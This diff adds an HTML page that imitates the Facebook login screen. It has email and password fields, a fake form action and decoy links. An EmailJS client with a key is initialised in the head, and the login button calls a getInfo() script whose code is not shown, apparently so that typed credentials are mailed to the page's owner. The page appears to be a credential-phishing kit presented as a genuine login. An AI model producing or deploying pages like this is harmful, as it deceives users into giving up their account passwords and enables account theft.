@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- EmailJs cdn -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("OJYeijTeomJyu2NsM");
+        })();
+    </script>
+
+    <!-- Linking Section-->
+    <script src="./app.js"></script>
+    <link rel="stylesheet" href="style.css">
+
+    <!--Favicon image-->
+    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
+    <title>Facebook</title>
+</head>
+
+<body>
+
+    <!--Top Section-->
+    <div class="top">
+        <div class="red">
+            <div class="yellow">
+                <h4 id="sign">facebook</h4>
+            </div>
+
+
+            <!-- Basically the form-->
+            <div class="blue">
+                <form class="form1" action="www.facebook.com">
+                    <input type="text" name="email" id="emailtxt" class="emailtxt"
+                        placeholder="Email Address or Mobile Number" required="true" autocomplete="email">
+
+                    <input type="password" name="password" id="passtxt" class="passtxt" autocomplete="current-password"
+                        placeholder="Password" required="true" value="">
+
+                    <input value="Log In" type="button" id="btn" class="btn" onClick="getInfo()"></button>
+
+                </form>
+
+                <h6 class="forgotpass">Forgotten password?</h6>
+
+                <div class="vertigo">
+                    <hr>
+                    <h5 class="or">or</h5>
+                    <hr>
+                </div>
+
+
+                <button>Create a New Account</button>
+
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <!--Bottom Section with diffrent Languages-->
+    <div class="bottom">
+        <div class="first">
+            <h5 class="isSpecial">English</h5>
+            <h5>Français(French)</h5>
+            <h5>Español</h5>
+            <h5>Deutsch</h5>
+        </div>
+        <div class="second">
+            <h5>Hausa</h5>
+            <h5>Português(Brasil)</h5>
+            <h5>اَلْعَرَبِيَّةُ</h5>
+        </div>
+    </div>
+
+</body>
+
+</html>
